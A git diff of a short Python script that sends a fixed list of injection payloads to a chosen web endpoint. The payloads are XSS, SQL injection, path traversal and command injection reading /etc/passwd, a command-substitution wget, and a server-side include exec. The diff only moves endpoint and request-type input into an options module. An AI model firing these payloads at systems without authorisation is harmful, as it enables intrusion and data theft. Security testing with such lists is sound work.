@@ -1,18 +1,17 @@
 import time
 import requests
+from services.options import Input
 
 array_injections = ['0x200', "<script>alert('hacked')</script>", '../../etc/passwd',
     '; cat /etc/passwd', "$(`echo(wget http://google.com)`)", "' OR 'a'='a",
     '*/*', "') or (SELECT admin FROM users WHERE admin = true AND ''='",
     '<!--#exec cmd="ls ../"-->']
 
-end_point = input('[!] Please provide an endpoint \
-(Please mark your entry Ex: http://myvulnsite.com/index.php?id=[]): ')
-
-request_type = input('[!] GET, POST, PUT, DELETE? ')
-
 # Add Option to choose types of injections
 # Add for authorization if needed
+
+end_point = Input.ep_options()
+request_type = Input.req_options()
 
 for arr in array_injections:
     try:
